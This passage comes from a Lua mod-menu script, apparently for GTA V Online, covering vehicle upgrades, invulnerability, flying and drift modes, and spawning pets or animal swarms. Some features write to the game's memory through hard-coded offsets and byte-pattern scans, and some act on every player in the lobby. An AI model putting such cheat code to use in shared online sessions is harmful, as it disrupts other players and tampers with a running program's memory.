            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end)

modificaciones = menu.list(vehicles, "Modifications on vehicles", {}, "")

menu.action(modificaciones, "Random upgrades", {}, "Only works on a vehicle that you get out yourself manually.", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), include_last_vehicle_for_vehicle_functions)
    if vehicle == 0 then util.toast("You're not in a vehicle >.<") else
        for mod_type = 0, 48 do
            local num_of_mods = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, mod_type)
            local random_tune = math.random(-1, num_of_mods - 1)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, mod_type, math.random(0,1) == 1)
            VEHICLE.SET_VEHICLE_MOD(vehicle, mod_type, random_tune, false)
        end
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, math.random(0,160), math.random(0,160))
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(0,6))
        for index = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, index, math.random(0,1) == 1)
        end
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        menu.trigger_command(menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Wheels>Wheels Colour", 42), math.random(0,160))
    end
end)

menu.toggle_loop(modificaciones, "Random upgrades (Loop)", {}, "Only works on a vehicle that you get out yourself manually.", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), include_last_vehicle_for_vehicle_functions)
    if vehicle == 0 then util.toast("You're not in a vehicle >.<") else
        for mod_type = 0, 48 do
            local num_of_mods = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, mod_type)
            local random_tune = math.random(-1, num_of_mods - 1)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, mod_type, math.random(0,1) == 1)
            VEHICLE.SET_VEHICLE_MOD(vehicle, mod_type, random_tune, false)
        end
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, math.random(0,160), math.random(0,160))
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(0,6))
        for index = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, index, math.random(0,1) == 1)
        end
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        menu.trigger_command(menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Wheels>Wheels Colour", 42), math.random(0,160))
    end
end)

local rapid_khanjali
rapid_khanjali = menu.toggle_loop(modificaciones, "Rapid fire Khanjali", {}, "", function()
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    if ENTITY.GET_ENTITY_MODEL(player_veh) == util.joaat("khanjali") then
        VEHICLE.SET_VEHICLE_MOD(player_veh, 10, math.random(-1, 0), false)
    else
        util.toast("get inside a khanjali.")
        menu.trigger_command(rapid_khanjali, "off")
    end
end)

player_cur_car = 0

menu.toggle_loop(modificaciones, "Bulletproof", {}, "Makes the vehicle everything-proof", function(on)
    local play = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    if on then
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), true, true, true, true, true, false, false, true)
    else
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), false, false, false, false, false, false, false, false)
    end
end)

menu.toggle(modificaciones, "Contramedidas Infinitas", {"infinitecms"}, "Will give infinite countermeasures.", function(on)
    if VEHICLE.GET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car) < 100 then
        VEHICLE.SET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car, 100)
    end
end)

menu.toggle_loop(modificaciones, "SpiderMan", {}, "Will force your vehicle onto the ground \nYou'll have to stick to a building first.", function()
    local my_cur_car = entities.get_user_vehicle_as_handle()
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(my_cur_car)
    util.yield(50)
    ENTITY.APPLY_FORCE_TO_ENTITY(my_cur_car, 1, 0, 0, - 1.5, 0, 0, 0.5, 0, false, false, true)
end)

--------------------------------------------------------------------------------------------------------------------------------------------------------
-- Real Helicopter Mode Start

get_vtable_entry_pointer = function(address, index)
    return memory.read_long(memory.read_long(address) + (8 * index))
end
get_sub_handling_types = function(vehicle, type)
    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x918)
    local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
    local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
    local types = {registerd = sub_handling_count, found = 0}
    for i = 0, sub_handling_count - 1, 1 do
        local sub_handling_data = memory.read_long(sub_handling_array + 8 * i)
        if sub_handling_data ~= 0 then
            local GetSubHandlingType_address = get_vtable_entry_pointer(sub_handling_data, 2)
            local result = util.call_foreign_function(GetSubHandlingType_address, sub_handling_data)
            if type and type == result then return sub_handling_data end
            types[#types+1] = {type = result, address = sub_handling_data}
            types.found = types.found + 1
        end
    end
    if type then return nil else return types end
end
local thrust_offset = 0x8
local better_heli_handling_offsets = {
    ["fYawMult"] = 0x18, -- dont remember
    ["fYawStabilise"] = 0x20, --minor stabalization
    ["fSideSlipMult"] = 0x24, --minor stabalizaztion
    ["fRollStabilise"] = 0x30, --minor stabalization
    ["fAttackLiftMult"] = 0x48, --disables most of it
    ["fAttackDiveMult"] = 0x4C, --disables most of the other axis
    ["fWindMult"] = 0x58, --helps with removing some jitter
    ["fPitchStabilise"] = 0x3C --idk what it does but it seems to help
}

realheli = menu.list(vehicles, "Helicopters", {}, "Real control options in the helicopter")

menu.slider_float(realheli, "Real helicopter power", {"heliThrust"}, "Helicopter's power", 0, 1000, 50, 1, function (value)
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        memory.write_float(CflyingHandling + thrust_offset, value * 0.01)
    else
        util.toast("Error\nGet in a helicopter")
    end
end)

menu.action(realheli, "Real helicopter mode", {"betterheli"}, "Disables the vertical estabilization of the vtol for real functioning mode", function ()
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        for _, offset in pairs(better_heli_handling_offsets) do
            memory.write_float(CflyingHandling + offset, 0)
        end
        util.toast("Echo\nTry not to crash")
    else
        util.toast("Error\nGet in a helicopter")
    end
end)

-- Real Helicopter Mode End
--------------------------------------------------------------------------------------------------------------------------------------------------------
--Impulse SportMode start


sportmode = menu.list(vehicles, "Sportmode", {}, "The SportMode we all remember from Impusle :'3")

PEDD = {
	["GET_VEHICLE_PED_IS_IN"]=function(--[[Ped (int)]] ped,--[[BOOL (bool)]] includeLastVehicle)native_invoker.begin_call();native_invoker.push_arg_int(ped);native_invoker.push_arg_bool(includeLastVehicle);native_invoker.end_call("9A9112A0FE9A4713");return native_invoker.get_return_value_int();end,
}
PLAYERR = {
	["PLAYER_PED_ID"]=function()native_invoker.begin_call();native_invoker.end_call("D80958FC74E988A6");return native_invoker.get_return_value_int();end,
}
CAMM = {
	["GET_GAMEPLAY_CAM_ROT"]=function(--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("837765A25378F0BB");return native_invoker.get_return_value_vector3();end,
	["SET_CAM_ROT"]=--[[void]] function(--[[Cam (int)]] cam,--[[float]] rotX,--[[float]] rotY,--[[float]] rotZ,--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(cam);native_invoker.push_arg_float(rotX);native_invoker.push_arg_float(rotY);native_invoker.push_arg_float(rotZ);native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("85973643155D0B07");end,
	["_SET_GAMEPLAY_CAM_RELATIVE_ROTATION"]=--[[void]] function(--[[float]] roll,--[[float]] pitch,--[[float]] yaw)native_invoker.begin_call();native_invoker.push_arg_float(roll);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(yaw);native_invoker.end_call("48608C3464F58AB4");end,

}
ENTITYY = {
	["SET_ENTITY_ROTATION"]=function(--[[Entity (int)]] entity,--[[float]] pitch,--[[float]] roll,--[[float]] yaw,--[[int]] rotationOrder,--[[BOOL (bool)]] p5)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(roll);native_invoker.push_arg_float(yaw);native_invoker.push_arg_int(rotationOrder);native_invoker.push_arg_bool(p5);native_invoker.end_call("8524A8B0171D5E07");end,
	["SET_ENTITY_COLLISION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle,--[[BOOL (bool)]] keepPhysics)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.push_arg_bool(keepPhysics);native_invoker.end_call("1A9205C1B9EE827F");end,
	["APPLY_FORCE_TO_ENTITY"]=function(--[[Entity (int)]] entity,--[[int]] forceFlags,--[[float]] x,--[[float]] y,--[[float]] z,--[[float]] offX,--[[float]] offY,--[[float]] offZ,--[[int]] boneIndex,--[[BOOL (bool)]] isDirectionRel,--[[BOOL (bool)]] ignoreUpVec,--[[BOOL (bool)]] isForceRel,--[[BOOL (bool)]] p12,--[[BOOL (bool)]] p13)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_int(forceFlags);native_invoker.push_arg_float(x);native_invoker.push_arg_float(y);native_invoker.push_arg_float(z);native_invoker.push_arg_float(offX);native_invoker.push_arg_float(offY);native_invoker.push_arg_float(offZ);native_invoker.push_arg_int(boneIndex);native_invoker.push_arg_bool(isDirectionRel);native_invoker.push_arg_bool(ignoreUpVec);native_invoker.push_arg_bool(isForceRel);native_invoker.push_arg_bool(p12);native_invoker.push_arg_bool(p13);native_invoker.end_call("C5F68BE9613E2D18");end,
	["FREEZE_ENTITY_POSITION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.end_call("428CA6DBD1094446");end,
}
VEHICLEE = {
	["SET_VEHICLE_FORWARD_SPEED"]=function(--[[Vehicle (int)]] vehicle,--[[float]] speed)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_float(speed);native_invoker.end_call("AB54A438726D25D5");end,
	["SET_VEHICLE_GRAVITY"]=function(--[[Vehicle (int)]] vehicle,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_bool(toggle);native_invoker.end_call("89F149B6131E57DA");end,
	["SET_VEHICLE_EXTRA_COLOURS"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] pearlescentColor,--[[int]] wheelColor)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(pearlescentColor);native_invoker.push_arg_int(wheelColor);native_invoker.end_call("2036F561ADD12E33");end,

}
PADD = {
	["IS_CONTROL_PRESSED"]=function(--[[int]] padIndex,--[[int]] control)native_invoker.begin_call();native_invoker.push_arg_int(padIndex);native_invoker.push_arg_int(control);native_invoker.end_call("F3A21BCD95725A4A");return native_invoker.get_return_value_bool();end,
}

veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
local is_vehicle_flying = false
local dont_stop = false
local no_collision = false
local speed = 6
local reset_veloicty = false

menu.toggle(sportmode, "Fly with car", {"vehfly"}, "I recommend binding a key to this command.", function(on_click)
    is_vehicle_flying = on_click
    if reset_veloicty then 
        ENTITYY.FREEZE_ENTITY_POSITION(veh, true)
        util.yield()
        ENTITYY.FREEZE_ENTITY_POSITION(veh, false)
    end
end)
menu.slider(sportmode, "Speed", {}, "", 1, 100, 6, 1, function(on_change) 
    speed = on_change
end)
menu.toggle(sportmode, "Don't stop", {}, "", function(on_click)
    dont_stop = on_click
end)
menu.toggle(sportmode, "Reset speed", {}, "If you don't stop moving after turning it off, click here", function(on_click)
    reset_veloicty = on_click
end)
menu.toggle(sportmode, "No collision", {}, "", function(on_click)
    no_collision = on_click
end)


vehicleroll = 0


function do_vehicle_fly() 
    veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
    cam_pos = CAMM.GET_GAMEPLAY_CAM_ROT(0);
    ENTITYY.SET_ENTITY_ROTATION(veh, cam_pos.x, vehicleroll, cam_pos.z, 2, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, not no_collision, true);
    if PADD.IS_CONTROL_PRESSED(0, 108) then 
        vehicleroll = vehicleroll -1
    end

    if PADD.IS_CONTROL_PRESSED(0, 109) then 
        vehicleroll = vehicleroll +1
       
    end

    local locspeed = speed*10
    local locspeed2 = speed
    if PADD.IS_CONTROL_PRESSED(0, 61) then 
        locspeed = locspeed*2
        locspeed2 = locspeed2*2
    end

    
    if PADD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 72) then
		local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed * 2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
        end
   end
    if PADD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed)*2
        if not PADD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed*2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
	if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
    end
end


util.create_tick_handler(function() 


    -- Added by LAZ
    if PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(),false) == 0 then
        if is_vehicle_flying then
            menu.trigger_commands("vehfly")
            util.toast("Sportmode apagado, no esta en un vehiculo")
        end
    else
        if is_vehicle_flying then do_vehicle_fly() end


    end

    -- End Added by LAZ

    VEHICLEE.SET_VEHICLE_GRAVITY(veh, not is_vehicle_flying) 
    if not is_vehicle_flying then 
        ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    end

    return true
end)

util.on_stop(function() 
    VEHICLEE.SET_VEHICLE_GRAVITY(veh, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, true, true);
end)

--------------------------------------------------------------------------------------------------------------------------------
-- Drift Mode Start

local function getCurrentVehicle() 
	local player_id = PLAYER.PLAYER_ID()
	local player_ped = PLAYER.GET_PLAYER_PED(player_id)
    local player_vehicle = 0
    if (PED.IS_PED_IN_ANY_VEHICLE(player_ped)) then
        veh = PED.GET_VEHICLE_PED_IS_USING(player_ped)
        if (NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh)) then
            player_vehicle = veh
        end 
    end
    return player_vehicle
end

local function getHeadingOfTravel(veh) 
    local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
    local x = velocity.x
    local y = velocity.y
    local at2 = math.atan(y, x)
    return math.fmod(270.0 + math.deg(at2), 360.0)
end

local function slamDatBitch(veh, height) 
    if (VEHICLE.IS_VEHICLE_ON_ALL_WHEELS(veh) and not ENTITY.IS_ENTITY_IN_AIR(veh)) then
     
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1,    0, 0, height,    0, 0, 0,   true, true)
    end
end

local function getCurGear()
    return memory.read_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(CurrentGearOffset))
end

local function getNextGear()
    return memory.read_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(NextGearOffset))
end

local function setCurGear(gear)
    memory.write_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(CurrentGearOffset), gear)
end

local function setNextGear(gear)
    memory.write_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(NextGearOffset), gear)
end

local function asDegrees(angle)
    return angle * (180.0 / 3.14159265357); 
end

local function wrap360(val) 
    while (val < 0.0) do
        val = val + 360.0
    end
    while (val > 360.0) do
        val = val - 360.0
    end
    return val
end

driftmodee = menu.list(vehicles, "DriftMode", {}, "Bro i dont understand some of the useless things the dev puts in here, its just fucking drift mode ok, there's not a single catch to it.")

local gs_driftMinSpeed = 8.0
local gs_driftMaxAngle = 50.0
local ControlVehicleAccelerate = 71
local ControlVehicleBrake = 72
local ControlVehicleDuck = 73
local ControlVehicleSelectNextWeapon = 99
local ControlVehicleMoveUpOnly = 61
local INPUT_FRONTEND_LS = 209
local DriftActivateKeyboard = INPUT_FRONTEND_LS

CurrentGearOffset = memory.scan("A8 02 0F 84 ? ? ? ? 0F B7 86")+11
NextGearOffset = memory.scan("A8 02 0F 84 ? ? ? ? 0F B7 86")+18

local isDrifting      = 0
local wasDrifting     = 0
local isDriftFinished = 1
local prevGripState   = 0
local lastDriftAngle  = 0.0
local oldGripState    = 0
local debug_notification = 0

textDrawCol = {
    r = 255,
    g = 255,
    b = 255,
    a = 255
}



local function driftmod_ontick() 
    local player = players.user()
    local veh = getCurrentVehicle()
   

    local inVehicle   = veh ~= 0
    local isDriving   = true

    local mps = ENTITY.GET_ENTITY_SPEED(veh)
    local mph       = mps * 2.23694
    local kmh       = mps * 3.6

    if inVehicle and isDriving and not isDrifting and not isDriftFinished then
        isDriftFinished = true
    end

    if not inVehicle or not isDriving then
        return
    end

    local driftKeyPressed = PAD.IS_CONTROL_PRESSED(2, ControlVehicleDuck) or PAD.IS_DISABLED_CONTROL_PRESSED(2, ControlVehicleDuck) or PAD.IS_CONTROL_PRESSED(0, DriftActivateKeyboard) or PAD.IS_DISABLED_CONTROL_PRESSED(0, DriftActivateKeyboard)

    if (driftKeyPressed and getCurGear(veh) > 2) then
        setCurGear(2)
        setNextGear(2)
    end
    if driftKeyPressed then
         
        if (PAD.GET_CONTROL_NORMAL(2, ControlVehicleBrake) > 0.1) then
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, ControlVehicleBrake, 0)
            local neg = -0.3

            if (PAD.IS_CONTROL_PRESSED(2, ControlVehicleSelectNextWeapon)) then
                neg = 10
            end

            slamDatBitch(veh, neg * 1 * PAD.GET_CONTROL_NORMAL(2, ControlVehicleBrake))
        end 

        local angleOfTravel  = getHeadingOfTravel(veh)
        local angleOfHeading = ENTITY.GET_ENTITY_HEADING_FROM_EULERS(veh)
        
        local driftAngle = angleOfHeading - angleOfTravel

        if driftAngle and lastDriftAngle then
            local diff = driftAngle - lastDriftAngle

            if diff > 180.0 then
                driftAngle = driftAngle - 360.0 
            end
            if diff < 180.0 then
                driftAngle = driftAngle - 360.0
            end
        end

        driftAngle     = wrap360(driftAngle)
        lastDriftAngle = driftAngle

        local zeroBasedDriftAngle = 360 - driftAngle
        if zeroBasedDriftAngle > 180 then
            zeroBasedDriftAngle = 0 - (360 - zeroBasedDriftAngle)
        end

        directx.draw_text(0,0,"Drift Angle: " .. math.floor(zeroBasedDriftAngle) .. "°", ALIGN_TOP_CENTRE,1,textDrawCol)
        local done = false
        if ((isDrifting or kmh > gs_driftMinSpeed) and (math.abs(driftAngle - 360.0) < gs_driftMaxAngle) or (driftAngle < gs_driftMaxAngle)) then
            isDrifting      = 1
            isDriftFinished = 1; 

            if driftKeyPressed then
                 
                if driftKeyPressed ~= oldGripState then
                    VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
                    oldGripState = driftKeyPressed
                end
            end
            done = true
        end

        if not done and kmh < gs_driftMinSpeed then
            if driftKeyPressed then
                if driftKeyPressed ~= oldGripState then
                    VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
                    oldGripState = driftKeyPressed
                end
            end
            done = true
        end

        if not done then
            if driftKeyPressed == oldGripState then
                VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
                oldGripState = 0
            end

            if math.abs(zeroBasedDriftAngle) > gs_driftMaxAngle then
                if zeroBasedDriftAngle > 0 then
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, true)
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, false)

                 
                    util.toast("Counter-steering left ")
                    
                    VEHICLE.SET_VEHICLE_STEER_BIAS(veh, math.rad(zeroBasedDriftAngle * 0.69))
              
                else
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, true)
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, false)
              

                    util.toast("Counter-steering right")

                    VEHICLE.SET_VEHICLE_STEER_BIAS(veh, math.rad(zeroBasedDriftAngle * 0.69))
      
                end
            end
		else 
			VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, false)
			VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, false)
        end
    end

    if not driftKeyPressed and prevGripState then
        isDrifting      = 0
        isDriftFinished = 0
        lastDriftAngle = 0

        if driftKeyPressed ~= oldGripState then
            VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
            oldGripState = driftKeyPressed
        end
    end

    prevGripState = driftKeyPressed
    if isDrifting ~= wasDrifting then
        wasDrifting     = isDrifting
        changedDrifting = true
    end
end


menu.toggle_loop(driftmodee,"Driftmode", {},"Presiona SHIFT para driftear",function(on)
	driftmod_ontick()
end)
driftSetings = menu.list(driftmodee, "Settings", {}, "")

menu.slider(driftSetings,"Velocidad minima /100", {}, "/100", 0, 10000, gs_driftMinSpeed*100, 1, function(on)
    gs_driftMinSpeed = on/100
end)

menu.slider(driftSetings,"Angulo maximo /100", {}, "/100", 0, 10000,gs_driftMaxAngle*100, 1, function(on)
    gs_driftMaxAngle = on/100
end)

menu.colour(driftSetings,"Color del texto", {}, "", textDrawCol,true , function(newCol)
    textDrawCol = newCol
end)



--------------------------------------------------------------------------------------------------------------------------------
-- Diversion

local randomizer = function(x)
    local r = math.random(1,3)
    return x[r]
end

array = {"1","2","3"}

menu.action(fun, "Pull the trigger", {}, "Play russian roulette with a friend", function()
    if randomizer(array) == "1" then
        util.toast("You survived! :D")
    else
        util.log("get shit on D:")
        menu.trigger_commands("yeet")
    end
end)

menu.action(fun, "Snow wars", {}, "Gives every player in the lobby a snowball.", function ()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        util.toast("Now everyone has snowballs!")
        util.yield()
    end
   
end)

menu.toggle(fun, "Tesla pilot", {}, "", function(toggled)
    local ped = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    ryze.request_model(tesla_ai)
    ryze.request_model(tesla)
    if toggled then     
       if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            menu.trigger_commands("deletevehicle")
        end

        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true) 
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(ped, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")

        if HUD.IS_WAYPOINT_ACTIVE() then
            local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20.0, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20.0, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)

local fpets = menu.list(fun, "Mascots", {}, "Just use 1 at once")

menu.toggle_loop(fpets, "Doggo Mascot", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_shepherd")
        ryze.request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)


menu.toggle_loop(fpets, "Husky Mascot", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_Husky")
        ryze.request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Chicken Mascot", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_hen")
        ryze.request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

local atacks = menu.list(fun, "Attack", {}, "Various animal attacks")

local cat_army = {}
local army = menu.list(atacks, "Cat Attack", {}, "Saca gatos... MUCHOS GATOS!!")
menu.click_slider(army, "Spawn G attack", {}, "", 1, 256, 30, 1, function(val)
    local player = players.user_ped()
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local ped = util.joaat("a_c_cat_01")
    ryze.request_model(ped)
     for i = 1, val do
        cat_army[i] = entities.create_ped(28, ped, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(cat_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(cat_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(cat_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(cat_army[i], player, 0, -0.3, 0, 7.0, -1, 10, true)
        util.yield()
     end 
end)

menu.action(army, "Clean G", {}, "", function()
    for i, ped in ipairs(cat_army) do
        entities.delete_by_handle(cat_army[i])
    end
end)

local hen_army = {}
